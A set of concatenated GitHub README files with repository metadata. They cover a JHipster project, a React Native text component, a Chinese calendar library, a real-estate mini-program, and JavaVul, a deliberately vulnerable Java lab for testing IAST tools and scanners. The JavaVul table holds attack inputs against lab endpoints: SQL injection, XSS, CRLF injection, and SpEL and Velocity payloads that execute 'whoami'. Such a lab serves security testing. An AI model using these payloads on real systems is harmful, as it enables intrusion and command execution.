JHipster Control Center 可以帮助您管理和控制您的应用程序。 您可以使用以下命令启动本地控制中心服务器（可通过 http://localhost:7419 访问）：

```
docker compose -f src/main/docker/jhipster-control-center.yml up
```

## 测试

### 运行Spring Boot 测试

要启动应用程序的测试，请运行：

```
./mvnw verify
```

### Client tests

Unit tests are run by [Jest][]. They're located in [front/src/test/javascript/](front/src/test/javascript/) and can be run with:

```
./npmw test
```

## 其他

### 使用Sonar进行代码质量控制

Sonar用于分析代码质量。 您可以使用以下命令启动本地 Sonar 服务器（可通过 http://localhost:9001 访问）：

```
docker compose -f src/main/docker/sonar.yml up -d
```

Note: we have turned off forced authentication redirect for UI in [src/main/docker/sonar.yml](src/main/docker/sonar.yml) for out of the box experience while trying out SonarQube, for real use cases turn it back on.

You can run a Sonar analysis with using the [sonar-scanner](https://docs.sonarqube.org/display/SCAN/Analyzing+with+SonarQube+Scanner) or by using the maven plugin.

Then, run a Sonar analysis:

```
./mvnw -Pprod clean verify sonar:sonar -Dsonar.login=admin -Dsonar.password=admin
```

If you need to re-run the Sonar phase, please be sure to specify at least the `initialize` phase since Sonar properties are loaded from the sonar-project.properties file.

```
./mvnw initialize sonar:sonar -Dsonar.login=admin -Dsonar.password=admin
```

Additionally, Instead of passing `sonar.password` and `sonar.login` as CLI arguments, these parameters can be configured from [sonar-project.properties](sonar-project.properties) as shown below:

```
sonar.login=admin
sonar.password=admin
```

For more information, refer to the [Code quality page][].

### Using Docker to simplify development (optional)

You can use Docker to improve your JHipster development experience. A number of docker-compose configuration are available in the [src/main/docker](src/main/docker) folder to launch required third party services.

For example, to start a mysql database in a docker container, run:

```
docker compose -f src/main/docker/mysql.yml up -d
```

To stop it and remove the container, run:

```
docker compose -f src/main/docker/mysql.yml down
```

You can also fully dockerize your application and all the services that it depends on.
To achieve this, first build a docker image of your app by running:

```
npm run java:docker
```

Or build a arm64 docker image when using an arm64 processor os like MacOS with M1 processor family running:

```
npm run java:docker:arm64
```

Then run:

```
docker compose -f src/main/docker/app.yml up -d
```

When running Docker Desktop on MacOS Big Sur or later, consider enabling experimental `Use the new Virtualization framework` for better processing performance ([disk access performance is worse](https://github.com/docker/roadmap/issues/7)).

For more information refer to [Using Docker and Docker-Compose][], this page also contains information on the docker-compose sub-generator (`jhipster docker-compose`), which is able to generate docker configurations for one or several JHipster applications.

## Continuous Integration (optional)

To configure CI for your project, run the ci-cd sub-generator (`jhipster ci-cd`), this will let you generate configuration files for a number of Continuous Integration systems. Consult the [Setting up Continuous Integration][] page for more information.

[BegCode最新文档]: https://www.begcode.com
[Node.js]: https://nodejs.org/
[NPM]: https://www.npmjs.com/
[Webpack]: https://webpack.github.io/
[BrowserSync]: https://www.browsersync.io/
[Jest]: https://facebook.github.io/jest/
[Leaflet]: https://leafletjs.com/
[DefinitelyTyped]: https://definitelytyped.org/
",0,1,1,mit,0.0
charmy/react-native-stroke-text,main,"# React Native Stroke/Outline Text

[![npm version](https://badge.fury.io/js/@charmy.tech%2Freact-native-stroke-text.svg)](https://badge.fury.io/js/@charmy.tech%2Freact-native-stroke-text)

Allows you to add stylish text with stroke effects to your mobile applications. It is perfect for creating visually
appealing text elements with outline effects.

<h1 align=""center"">
  <img width=""550"" src=""docs/example.jpeg""/>
</h1>

## Installation

```bash
npm install @charmy.tech/react-native-stroke-text
# or
yarn add @charmy.tech/react-native-stroke-text
```

## Android
min ```compileSdkVersion``` is required to be ```34```
## iOS
Go to your ios folder and run:

```
pod install
```

## Usage

Here's a quick example to get you started with StrokeText:

```jsx
import React from ""react"";
import { StrokeText } from ""@charmy.tech/react-native-stroke-text"";
import { View } from ""react-native"";

export default function Screen() {
  return (
    <View style={{ flex: 1, justifyContent: ""center"", alignItems: ""center"" }}>
      <StrokeText
        text=""Test""
        fontSize={50}
        color=""#000000""
        strokeColor=""#c334eb""
        strokeWidth={20}
        fontFamily=""Nunito-Black""
      />
    </View>
  );
}

```

### Props

The following table outlines the props available for the `StrokeText` component:

| Prop            | Type    | Description                                                     |
|-----------------|---------|-----------------------------------------------------------------|
| `text`          | string  | The text content you want to display.                           |
| `fontSize`      | number  | Size of the text font, defining how large the text will be.     |
| `color`         | string  | Color of the text, can use any valid color format.              |
| `strokeColor`   | string  | Color of the stroke (outline) around the text.                  |
| `strokeWidth`   | number  | Width of the stroke, determining the thickness of the outline.  |
| `fontFamily`    | string  | Font family for the text, should match available project fonts. |
| `align`         | string  | Text alignment (default: `center`)                              |
| `numberOfLines` | number  | Number of lines (default: `0`)                                  |
| `ellipsis`      | boolean | Ellipsis (...) (default: `false`)                               |
| `width`         | number  | Text width to enable ellipsis (default: `undefined`)            |

## Ellipsis

```jsx
<StrokeText
  text=""Lorem ipsum""
    width={150} // +
    ellipsis={true} // +
    numberOfLines={1} // +
  fontSize={32}
  color=""#FFFFFF""
  strokeColor=""#000000""
  strokeWidth={2}
  fontFamily=""Nunito-Black""
  align=""center""
/>

```

<h1 align=""center"">
  <img width=""450"" src=""docs/ellipsis.jpeg""/>
</h1>

## Custom Font

### Bare React Native

Create a `react-native.config.js` file in the root directory

```javascript
module.exports = {
  project: {
    ios: {},
    android: {},
  },
  assets: ['/assets/fonts'], // or './src/assets/fonts'
};
```

### Expo ([expo-font](https://docs.expo.dev/versions/latest/sdk/font/))

```tsx
import { useFonts } from ""expo-font"";
import { Dosis_400Regular } from ""@expo-google-fonts/dosis"";


const [fontsLoaded, fontError] = useFonts({
  Danfo: require(""./src/assets/fonts/Danfo-Regular.ttf""),
  ""Dosis-Regular"": Dosis_400Regular,
});
```

## Contributing

We welcome contributions to improve this component. Feel free to submit issues and enhancement requests.

## License

Please refer to the project's license for usage rights and limitations.
",11,4,1,mit,3.0
6tail/tyme4j,master,"# Tyme [![License](https://img.shields.io/badge/license-MIT-4EB1BA.svg?style=flat-square)](https://github.com/6tail/tyme4j/blob/master/LICENSE)

Tyme是一个非常强大的日历工具库，可以看作 [Lunar](https://6tail.cn/calendar/api.html ""https://6tail.cn/calendar/api.html"") 的升级版，拥有更优的设计和扩展性，支持公历和农历、星座、干支、生肖、节气、法定假日等。

### Maven

```xml
<dependency>
  <groupId>cn.6tail</groupId>
  <artifactId>tyme4j</artifactId>
  <version>1.1.5</version>
</dependency>
```

## 示例

    import com.tyme.solar.SolarDay;
     
    public class Sample {
      public static void main(String[] args) {
        SolarDay solarDay = SolarDay.fromYmd(1986, 5, 29);
         
        // 1986年5月29日
        System.out.println(solarDay);
         
        // 农历丙寅年四月廿一
        System.out.println(solarDay.getLunarDay());
      }
    }

## 文档

请移步至 [https://6tail.cn/tyme.html](https://6tail.cn/tyme.html ""https://6tail.cn/tyme.html"")

## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=6tail/tyme4j&type=Date)](https://star-history.com/#6tail/tyme4j&Date)
",15,2,1,mit,3.0
youdeyunke/app,master,"![友得云客房产小程序-社区版](https://tcdn.udeve.net/fang2021/4bbe636b-e0e8-4580-8bb0-66bbf61f11bd.png)

<div align=""center"">

[产品官网](https://www.youdeyunke.com/?statId=6) | [帮助文档](https://youdeyunke.yuque.com/r/organizations/homepage) | [加入群聊](https://tcdn.udeve.net/udyk/66064f7e8ecade73b2385bb3.jpg)

</div>

# 友得云客房产小程序【社区版】<span>💯开源</span>


## 系统简介
友得云客房产小程序是一款专为房产行业打造的线上营销获客小程序系统，致力于帮助房产企业搭建私域流量平台，以数字化精准营销提升销售效果，驱动业绩增长。作为行业先行者，我们深谙互联网线上营销的要义，将多年的经验与技术融汇于一身，为您提供完善的、已成型的房产小程序系统。基于此【社区版】您无需授权即可获取全部源代码，并进行二次开发，允许用于商业用途，但需要保留版权信息。


## 安装教程

*   [从宝塔面板docker应用商店一键安装服务端教程](https://youdeyunke.yuque.com/fbxh1v/install/bt)
*  [小程序端搭建教程](https://youdeyunke.yuque.com/fbxh1v/install/dt57os0gz4dk8h5b)


## 在线演示

| 内容 | 社区版|  专业版   |
| --- | --- | --- |
| 管理端演示地址 | https://demo2.youdeyunke.com/ | https://demo.youdeyunke.com/admin/index.html |
| 管理端演示用户名 | 	`gitee@youdeyunke.com` | `gitee@youdeyunke.com` |
| 管理端演示用户密码 | `88888888` | [咨询客服获取密码](https://work.weixin.qq.com/kfid/kfc8a0f8817daf2ec01) |
| 网站端演示地址 | `不支持` | https://demo.youdeyunke.com |
| 小程序演示 | ![](https://tcdn.udeve.net/udyk/672eec7ae4b07694cf4cb409.png) |  ![](https://tcdn.udeve.net/udyk/65a0d469b33aac0d968a3529.jpg) |


## 商用须知

社区版允许用于商业用途，而无需取得授权。但需要在小程序首页底部保留“友得云客”品牌露出，未经允许不可移除此标志，否则将构成侵权，我公司将委托律师事务所进行维权。

* 示例：
![](https://tcdn.udeve.net/udyk/672eebbfe4b07694cf4cb408.png)

* 素材图片:https://tcdn.udeve.net/udyk/65ae2b4db33ac5e0e29f7ccf.png
* 尺寸规范：宽度不少于120rpx，高度不少于60rpx
* 显示位置：小程序首页底部居中显示



## 界面截图
![友得云客房产小程序界面截图](https://demo-1255998955.cos.ap-shanghai.myqcloud.com/udyk/screens.png)


## 成功案例

以下成功案例均基于【友得云客】进行构建，案例中的业务类型包括：线上售楼部、海外房产、房产自媒体、房产分销等多种不同业务类型

| ![](https://tcdn.udeve.net/fang2021/2fb1dc49-a444-4d66-8de2-7dac4221f166.jpg?imageView2/2/w/400) | ![](https://tcdn.udeve.net/fang2021/2a013aa5-466e-436a-85fc-aa1c8f62e6d9.jpg?imageView2/2/w/400) | ![](https://tcdn.udeve.net/fang2021/783455da-f320-4ade-bf8a-bc8fbb265236.jpg?imageView2/2/w/400) |
| :----------------------------------------------------------: | :----------------------------------------------------------: | :----------------------------------------------------------: |
|                            汉普顿                            |                          青特云置业                          |                            巧房子                            |
| ![](https://tcdn.udeve.net/fang2021/0fada889-b400-4b29-bc14-bf2e2202490d.jpg?imageView2/2/w/400) | ![](https://tcdn.udeve.net/fang2021/25eee934-77d9-4492-900f-c2d4259226d7.jpg?imageView2/2/w/400) | ![](https://tcdn.udeve.net/fang2021/58e662ca-e7af-4e57-bed3-d2280831127f.jpg?imageView5/2/w/400) |
|                           宁波甬房                           |                          特变e享家                           |                         学长看房笔记                         |



## 参与贡献

1. Fork 本仓库
2. 新建 feature-xxx 分支
3. 提交代码
4. 新建 Merge Request


## 特别鸣谢
特别感谢以下开源项目

 * vant-ui
 * ElementUI
 * mysql
 * docker
 * 宝塔面板
 

## 版权须知

Apache License 2.0 许可的主要内容包括：

授权：允许任何人以任何目的使用、复制、修改和分发该软件。

版权声明：要求在软件和相关文档中包含原始版权声明和许可证声明。

保证免责：表明该软件是按现状提供的，没有任何明示或暗示的担保或保证。作者不承担任何赔偿责任。

贡献者授权：要求所有贡献者授予 Apache 软件基金会永久性的、免费的、不可撤销的许可，以使用、复制、修改和分发其贡献。

专利许可：为了保护使用该软件的用户，该许可要求贡献者授权任何必要的专利许可，以便将其用于 Apache 软件基金会的项目。

Apache License 2.0 是一种宽松的开源许可，允许人们自由使用、修改和分发软件。

本项目包含的第三方源码和二进制文件之版权信息另行标注。

*友得云客®* 商标和著作权所有者为优得（西安）信息科技有限公司。侵权必究

**本软件已登记软著，必须保留原始版权文字信息，违者将依法追究法律责任。**


![](https://tcdn.udeve.net/udyk/672eef97e4b07694cf4cb40a.png)
",1,0,1,apache-2.0,0.0
lokerxx/JavaVul,master,"# JavaVul

![](https://socialify.git.ci/lokerxx/JavaVul/image?description=1&font=Inter&forks=1&name=1&owner=1&pattern=Circuit%20Board&stargazers=1&theme=Light)

## 介绍

Java 安全漏洞靶场，用于测试IAST和扫描器的被动扫描功能，集合了多个安全漏洞，利用docker镜像为每个靶场独立环境运行。

文章：[IAST实践总结](https://mp.weixin.qq.com/s/ahxKXv5eKcULVF_VqAjbyg)

## 部署

mvn版本

```sh
# mvn --version
Apache Maven 3.0.5 (Red Hat 3.0.5-17)
Maven home: /usr/share/maven
Java version: 1.8.0_192, vendor: Oracle Corporation
Java home: /usr/java/jdk1.8.0_192/jre
Default locale: en_US, platform encoding: UTF-8
OS name: ""linux"", version: ""3.10.0-1160.el7.x86_64"", arch: ""amd64"", family: ""unix""
```

docker和docker-compose版本

```sh
# docker version
Client:
 Version:         1.13.1
 API version:     1.26
 Package version: docker-1.13.1-209.git7d71120.el7.centos.x86_64
 Go version:      go1.10.3
 Git commit:      7d71120/1.13.1
 Built:           Wed Mar  2 15:25:43 2022
 OS/Arch:         linux/amd64

Server:
 Version:         1.13.1
 API version:     1.26 (minimum version 1.12)
 Package version: docker-1.13.1-209.git7d71120.el7.centos.x86_64
 Go version:      go1.10.3
 Git commit:      7d71120/1.13.1
 Built:           Wed Mar  2 15:25:43 2022
 OS/Arch:         linux/amd64
 Experimental:    false

# docker-compose version
docker-compose version 1.18.0, build 8dd22a9
docker-py version: 2.6.1
CPython version: 3.6.8
OpenSSL version: OpenSSL 1.0.2k-fips  26 Jan 2017
```

> 默认docker和docker-compose太低，需要安装比较新的
>
> ```
>  yum remove docker \
>               docker-client \
>               docker-client-latest \
>               docker-common \
>               docker-latest \
>               docker-latest-logrotate \
>               docker-logrotate \
>               docker-engine
> 
> sudo yum install -y yum-utils
> sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo
> 
> sudo yum install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin docker-compose
> ```

下载项目

```sh
git clone https://github.com/lokerxx/JavaVul
```

以下是运行脚本：

|            文件            |                             作用                             |            运行            |
| :------------------------: | :----------------------------------------------------------: | :------------------------: |
| docker-compose-build.yaml  | 在容器里面构建jar包，每个靶场构建会重复构建（**构建速度会很慢，不建议**） | `bash run-build_images.sh` |
| docker-compose-local.yaml  | 宿主机maven构建各个靶场的jar包，多个靶场可以基于maven缓存快速构建（**推荐**） | `bash run-local-build.sh`  |
| docker-compose-remote.yaml | 直接去dockerhub下载我构建上传成功的镜像（**镜像更新不及时**） |    `bash run-remote.sh`    |

> 此外，需修改yaml文件里面`flask.environment.HOST`为宿主机的IP，用于跑测试用例。**然后我在yaml文件已经默认挂载agent.jar**，如果你们要测试IAST agent功能，直接替换到`agent/agent.jar`即可。我这边自己写了一个简单的java agent，参考下面[SimpleAgent]()

> 如果要测试被动代理扫描，需要修改`index/app.py`里面`proxy_mode`为`True`，修改自己的代理地址：`proxies`

> **修改完成之后，根据自己的需求，运行上面表格的sh脚本部署运行即可**。

> 因为漏洞应用比较多**但是接口比较少**，我给每个应用配置512-1024M内存（测试运行要16G内存）。如果要配置大一点测试 IAST AGENT，则可以批量修改`docker-compose.yaml`的`-Xms512m -Xmx1024m`的环境变量

> 基本web漏洞的代码审计的细节，参考这里：https://github.com/lokerxx/CybersecurityNote/tree/master/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA%E6%BC%8F%E6%B4%9E



### 压力测试

部署运行

|              文件               |                         作用                         |          运行          |
| :-----------------------------: | :--------------------------------------------------: | :--------------------: |
| docker-compose-microservice.yml | 运行多个springcloud微服务，用于测试多链路 IAST agent | `run-local-service.sh` |

测试用例

| 接口                                            | 压测命令                                                     |
| ----------------------------------------------- | ------------------------------------------------------------ |
| http://ip:29998/process-user-data?userData=test | ` ab -n 1000 -c 20 ""http://IP:29998/process-user-data?userData=test""` |



## 支持靶场

|          文件夹           |                           安全漏洞                           |  测试用途  |                       备注                        |
| :-----------------------: | :----------------------------------------------------------: | :--------: | :-----------------------------------------------: |
|  actuator_authorized_1.X  |                   actuator 未授权访问 1.X                    |    修复    |                                                   |
|  actuator_authorized_2.X  |                   actuator 未授权访问 2.X                    |    修复    |                                                   |
| actuator_unauthorized_1.X |                   actuator 未授权访问 1.X                    |    漏洞    |                                                   |
| actuator_unauthorized_2.X |                   actuator 未授权访问 2.X                    |    漏洞    |                                                   |
|         base_vul          | SQL注入、XSS、不安全文件操作、重定向漏洞、正则DOS漏洞、Crlf注入漏洞、命令注入漏洞、SPEL漏洞、SSRF漏洞、SSTI漏洞、不安全反射漏洞、XXE漏洞 |    漏洞    |                                                   |
|      base_vul_repair      | SQL注入、XSS、不安全文件操作、重定向漏洞、正则DOS漏洞、Crlf注入漏洞、命令注入漏洞、SPEL漏洞、SSRF漏洞、SSTI漏洞、不安全反射漏洞、XXE漏洞 |    修复    |                                                   |
|          cas_xxe          |                           XXE漏洞                            |    漏洞    | cas在3.1.1-3.5.1存在XXE漏洞<br />修复版本为3.6.0- |
|        collections        |                     collections 反序列化                     | **未完成** |                                                   |
|      CVE-2019-10173       |                     XStream反序列化漏洞                      |    漏洞    |                                                   |
|      CVE-2019-12384       |                jackson-databind 反序列化漏洞                 |    漏洞    |                                                   |
|     druid_authorized      |                       druid未授权漏洞                        |    修复    |                                                   |
|    druid_unauthorized     |                       druid未授权漏洞                        |    漏洞    |                                                   |
|        fastjson-*         |                 各个版本fastjson反序列化漏洞                 |    漏洞    |                                                   |
|         Hibernate         |                      Hibernate 注入漏洞                      | 修复、漏洞 |                                                   |
|          HSQLDB           |                       HSQLDB 注入漏洞                        | 修复、漏洞 |                                                   |
|            jsp            |                                                              | **未完成** |                  jsp版的base_vul                  |
|         log4jvul          |                         log4j2 漏洞                          |    漏洞    |                                                   |
|  microservice-*-service   |                          分布式服务                          |  性能测试  |            用于验证分布式微服务的性能             |
|         wxpay-xxe         |                       微信支付XXE漏洞                        |    漏洞    |                                                   |
|         logic_vul         |                        业务逻辑漏洞：                        |            |                                                   |
|                           |                                                              |            |                                                   |
|                           |                                                              |            |                                                   |
|                           |                                                              |            |                                                   |





## 运行

访问：`http://宿主机IP:5000/`

我配置了三种模式：

- 攻击：发送一些payload，触发漏洞
- 正常：有可能是漏洞，但是发送是正常的数据
- 修复：漏洞已经修复，但是payload不生效（过滤或者报错）
- 误报：IAST或SAST误报检测的安全漏洞

其中右边测试按钮，可以对这个接口进行用例测试。

![image-20240306164920221](.gitbook/assets/image-20240306164920221.png)

也可以自定义发送payload，进行调试

![image-20240306165001240](.gitbook/assets/image-20240306165001240.png)

也可以批量发送请求，各个漏洞的回显，会在下面显示。

![image-20240127215349622](.gitbook/assets/image-20240127215349622.png)



## SimpleAgent

Java Agent 是一种工具，它可以使用 Java Instrumentation API 在运行时修改字节码。一个非常简单的 Java Agent 可以仅仅记录一个消息，以表明它已被加载。

首先，创建 Agent 类 `SimpleAgent.java`：

```java
package my.agent;

import java.lang.instrument.Instrumentation;

public class SimpleAgent {
    public static void premain(String agentArgs, Instrumentation inst) {
        System.out.println(""SimpleAgent 已加载"");
    }
}
```

在这段代码中，`premain` 方法是 Java Agent 的入口点。它在应用程序的 `main` 方法之前被调用。

接下来，你需要一个 manifest 文件来指定 Agent-Class。创建一个名为 `MANIFEST.MF` 的文件，内容如下：

```
Manifest-Version: 1.0
Premain-Class: my.agent.SimpleAgent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```

这个 manifest 文件指定了 agent 类并启用了一些功能，如类的重定义和重转换。

现在，将 Java Agent 编译并打包成 JAR 文件。假设你的 Java 文件在 `src` 目录中，使用 `javac` 和 `jar` 命令，你可以这样做：

1. 编译 agent 类：

```sh
# javac -source 1.8 -target 1.8 -d . src/main/java/my/agent/SimpleAgent.java
```

2. 将编译后的类打包成带有 manifest 的 JAR 文件：

```sh
# jar cvfm SimpleAgent.jar MANIFEST.MF my/agent/SimpleAgent.class
added manifest
adding: my/agent/SimpleAgent.class(in = 492) (out= 320)(deflated 34%)
```

现在你有了一个可以作为 Java Agent 使用的 `SimpleAgent.jar`。要将这个 agent 附加到你的应用程序上，启动 Java 应用程序时使用 `-javaagent` 选项，将`SimpleAgent.jar`重命名到`./agent/agent.jar`

```sh
# mv SimpleAgent.jar ../agent/agent.jar
```



## 支持测试的漏洞

| 接口 | 漏洞名字 | 请求方法 | url | 接口类型 |
| :----------------------------------------: | :---------------------------------------------------------: | -------- | :----------------------------------------------------------: | :------: |
| druid_authorized | druid未授权漏洞 | GET | http://192.168.0.9:9996/druid | 修复 |
| actuator2_authorized | SpringBoot Actuator未授权访问漏洞2.X | GET | http://192.168.0.9:9994/actuator | 修复 |
| actuator1_authorized | SpringBoot Actuator未授权访问漏洞1.X | GET | http://192.168.0.9:9992/trace | 修复 |
| sql_injection_id_repair | SQL注入-mybatics-数字 | GET | http://192.168.0.9:9990/users/1'/ | 修复 |
| sql_injection_ids_repair | SQL注入-mybatics-数组 | GET | http://192.168.0.9:9990/users/ids/?ids=1,2,3' | 修复 |
| sql_injection_like_repair | SQL注入-mybatics-like模糊匹配 | GET | http://192.168.0.9:9990/users/name?name=A' | 修复 |
| sql_injection_strs_repair | SQL注入-mybatics-字符串数组 | GET | http://192.168.0.9:9990/users/names?names=Alice&names=Bob' | 修复 |
| sql_injection_orderby_repair | SQL注入-mybatics-排序 | GET | http://192.168.0.9:9990/users/sort?orderByColumn=name&orderByDirection=asc' | 修复 |
| xss_reflect_htmlEscape_repair | 反射型XSS漏洞-htmlEscape类 | GET | http://192.168.0.9:9990/xss_reflect_htmlEscape?name=<script>alert(123)</script> | 修复 |
| xss_reflect_escapeHtml4_repair | 反射型XSS漏洞-escapeHtml4类 | GET | http://192.168.0.9:9990/xss_reflect_escapeHtml4?name=<script>alert(123)</script> | 修复 |
| xss_reflect_escapeHtml_reparir | 反射型XSS漏洞-html编码 | GET | http://192.168.0.9:9990/xss_reflect_escapeHtml?name=<script>alert(123)</script> | 修复 |
| xss_storage_thymeleaf_reparir | 存储型XSS漏洞-thymeleaf模板过滤 | GET | http://192.168.0.9:9990/xss_storage_thymeleaf?name=<script>alert(123)</script> | 修复 |
| file_upload_repair | 任意文件上传漏洞 | POST | http://192.168.0.9:9990/file_upload | 修复 |
| file_read_repair | 文件读取漏洞 | GET | http://192.168.0.9:9990/file_read?filePath=pom.xml | 修复 |
| file_write_repair | 任意文件写入漏洞 | GET | http://192.168.0.9:9990/file_write?fileName=test.txt&data=test | 修复 |
| file_download_repair | 任意文件下载漏洞 | GET | http://192.168.0.9:9990/file_download?fileName=../test.log | 修复 |
| file_delete_repair | 任意文件删除漏洞 | GET | http://192.168.0.9:9990/file_delete?fileName=test.txt | 修复 |
| runtime_command_execute_repair | 命令执行漏洞-Runtime | GET | http://192.168.0.9:9990/runtime_command_execute?command=whoami | 修复 |
| process_builder_command_repair | 命令执行漏洞-ProcessBuilder | GET | http://192.168.0.9:9990/process_builder_command_execute?command=whoami | 修复 |
| crlf_injection_repair | CRLF注入 | GET | http://192.168.0.9:9990/crlf_injection?name=%0D%0ASet-Cookie: sessionid=123456 | 修复 |
| spel_expression_repair | SPEL表达式攻击 | GET | http://192.168.0.9:9990/spel_expression?input=T(java.lang.Runtime).getRuntime().exec('whoami') | 修复 |
| ssrf_openStream_repair | SSRF攻击-openStream | GET | http://192.168.0.9:9990/ssrf_openStream?url=https://www.baidu.com | 修复 |
| ssrf_openConnection_repair | SSRF攻击-openConnection | GET | http://192.168.0.9:9990/ssrf_openConnection?url=http://www.baidu.com | 修复 |
| ssrf_requestGet_repair | SSRF攻击-requestGet | GET | http://192.168.0.9:9990/ssrf_requestGet?url=http://www.baidu.com | 修复 |
| ssrf_okhttp_repair | SSRF攻击-okhttp | GET | http://192.168.0.9:9990/ssrf_okhttp?url=http://www.baidu.com | 修复 |
| ssrf_defaultHttpClient_repair | SSRF攻击-defaultHttpClient | GET | http://192.168.0.9:9990/ssrf_defaultHttpClient?url=http://www.baidu.com | 修复 |
| ssti_velocity_repair | SSTI攻击-velocity | GET | http://192.168.0.9:9990/ssti_velocity?content=%23set (%24exp %3d ""exp"")%3b%24exp.getClass().forName(""java.lang.Runtime"").getRuntime().exec(""whoami"") | 修复 |
| xxe_saxparserfactory_repair | XXE-saxparserfactory | POST | http://192.168.0.9:9990/xxe_saxparserfactory | 修复 |
| xxe_xmlreaderfactory_repair | XXE-xmlreaderfactory | POST | http://192.168.0.9:9990/xxe_xmlreaderfactory | 修复 |
| xxe_saxbuilder_repair | XXE-saxbuilder | POST | http://192.168.0.9:9990/xxe_saxbuilder | 修复 |
| xxe_saxreader_repair | XXE-saxreader | POST | http://192.168.0.9:9990/xxe_saxreader | 修复 |
| xxe_documentbuilderfactory_repair | XXE-documentbuilderfactory | POST | http://192.168.0.9:9990/xxe_documentbuilderfactory | 修复 |
| xxe_documentbuilderfactory_xinclude_repair | XXE-documentbuilderfactory_xinclude | POST | http://192.168.0.9:9990/xxe_documentbuilderfactory_xinclude | 修复 |
| OpenRedirector_ModelAndView_repair | URL重定向漏洞-ModelAndView | GET | http://192.168.0.9:9990/OpenRedirector_ModelAndView?url=https://www.baidu.com | 修复 |
| OpenRedirector_sendRedirect_repair | URL重定向漏洞-sendRedirect | GET | http://192.168.0.9:9990/OpenRedirector_sendRedirect?url=https://www.baidu.com | 修复 |
| OpenRedirector_lacation_repair | URL重定向漏洞-location | GET | http://192.168.0.9:9990/OpenRedirector_lacation?url=https://www.baidu.com | 修复 |
| swagger-ui_repair | swagger-ui-未授权访问漏洞 | GET | http://192.168.0.9:9990/swagger-ui.html | 修复 |
| sql_injection_Optional_repair | SQL注入-Optional<String> | GET | http://192.168.0.9:9990/users/findByOptionalUsername?username=test' | 修复 |
| sql_injection_Object_repair | SQL注入-Object[] | POST | http://192.168.0.9:9990/users/get_name_object | 修复 |
| sql_injection_Annotation_repair | SQL注入-MyBatis注解方式 | GET | http://192.168.0.9:9990/users/by-username?name=test | 修复 |
| sql_injection_lombok_repair | SQL注入-lombok | POST | http://192.168.0.9:9990/users/lombok | 修复 |
| sql_injection_hsqldb_repair | SQL注入-hsqldb | GET | http://192.168.0.9:9989/hsqldb_repair?username=1' | 修复 |
| sql_injection_Hibernate_repair | SQL注入-Hibernate | GET | http://192.168.0.9:9988/Hibernate_injection_repair?username=foobar' OR (SELECT COUNT(*) FROM User)>=0 OR 'foobar'=' | 修复 |
| log4j2_attack | Log4j2 远程代码执行漏洞（CVE-2021-44228） | POST | http://192.168.0.9:9998/log4j2 | 攻击 |
| fastjson1_2_24_attack | fastjson-1.2.24反序列漏洞 | POST | http://192.168.0.9:9999/fastjson1.2.24-process | 攻击 |
| fastjson1_2_25_attack | fastjson-1.2.25-1.2.47反序列漏洞-不需要AutoTypeSupport-通杀 | POST | http://192.168.0.9:9987/fastjson1.2.25-process | 攻击 |
| fastjson1_2_41_attack | fastjson-1.2.25-1.2.41反序列漏洞-setAutoTypeSupport | POST | http://192.168.0.9:9987/fastjson1.2.41-process-setAutoTypeSupport | 攻击 |
| fastjson1_2_42_attack | fastjson-1.2.42反序列漏洞 | POST | http://192.168.0.9:9986/fastjson1.2.42-process | 攻击 |
| fastjson1_2_43_attack | fastjson-1.2.43反序列漏洞 | POST | http://192.168.0.9:9985/fastjson1.2.43-process | 攻击 |
| fastjson1_2_45_attack | fastjson-1.2.45反序列漏洞 | POST | http://192.168.0.9:9984/fastjson1.2.45-process | 攻击 |
| fastjson1_2_59_attack_1 | fastjson-1.2.59反序列漏洞(1.2.5 <= 1.2.59)-payload1 | POST | http://192.168.0.9:9983/fastjson1.2.59-process | 攻击 |
| fastjson1_2_59_attack_2 | fastjson-1.2.59反序列漏洞(1.2.5 <= 1.2.59)-payload2 | POST | http://192.168.0.9:9983/fastjson1.2.59-process | 攻击 |
| fastjson1_2_60_attack_1 | fastjson-1.2.60反序列漏洞(1.2.5 <= 1.2.60)-payload1 | POST | http://192.168.0.9:9982/fastjson1.2.60-process | 攻击 |
| fastjson1_2_60_attack_2 | fastjson-1.2.60反序列漏洞(1.2.5 <= 1.2.60)-payload2 | POST | http://192.168.0.9:9982/fastjson1.2.60-process | 攻击 |
| fastjson1_2_61_attack_1 | fastjson-1.2.61反序列漏洞-payload1 | POST | http://192.168.0.9:9981/fastjson1.2.61-process | 攻击 |
| fastjson1_2_61_attack_2 | fastjson-1.2.61反序列漏洞-payload2 | POST | http://192.168.0.9:9981/fastjson1.2.61-process | 攻击 |
| fastjson1_2_62_attack_1 | fastjson-1.2.62反序列漏洞-payload1 | POST | http://192.168.0.9:9980/fastjson1.2.62-process | 攻击 |
| fastjson1_2_62_attack_2 | fastjson-1.2.62反序列漏洞-payload2 | POST | http://192.168.0.9:9980/fastjson1.2.62-process | 攻击 |
| fastjson1_2_66_attack_1 | fastjson-1.2.66反序列漏洞-payload1 | POST | http://192.168.0.9:9979/fastjson1.2.66-process | 攻击 |
| fastjson1_2_66_attack_2 | fastjson-1.2.66反序列漏洞-payload2 | POST | http://192.168.0.9:9979/fastjson1.2.66-process | 攻击 |
| fastjson1_2_66_attack_3 | fastjson-1.2.66反序列漏洞-payload3 | POST | http://192.168.0.9:9979/fastjson1.2.66-process | 攻击 |
| fastjson1_2_66_attack_4 | fastjson-1.2.66反序列漏洞-payload4 | POST | http://192.168.0.9:9979/fastjson1.2.66-process | 攻击 |
| fastjson1_2_66_attack_5 | fastjson-1.2.66反序列漏洞-payload5 | POST | http://192.168.0.9:9979/fastjson1.2.66-process | 攻击 |
| fastjson1_2_66_attack_6 | fastjson-1.2.66反序列漏洞-payload6 | POST | http://192.168.0.9:9979/fastjson1.2.66-process | 攻击 |
| fastjson1_2_67_attack_1 | fastjson-1.2.67反序列漏洞-payload1 | POST | http://192.168.0.9:9978/fastjson1.2.67-process | 攻击 |
| fastjson1_2_67_attack_2 | fastjson-1.2.67反序列漏洞-payload2 | POST | http://192.168.0.9:9978/fastjson1.2.67-process | 攻击 |
| fastjson1_2_68_attack_1 | fastjson-1.2.68反序列漏洞-payload1 | POST | http://192.168.0.9:9977/fastjson1.2.68-process | 攻击 |
| fastjson1_2_68_attack_2 | fastjson-1.2.68反序列漏洞-payload2 | POST | http://192.168.0.9:9977/fastjson1.2.68-process | 攻击 |
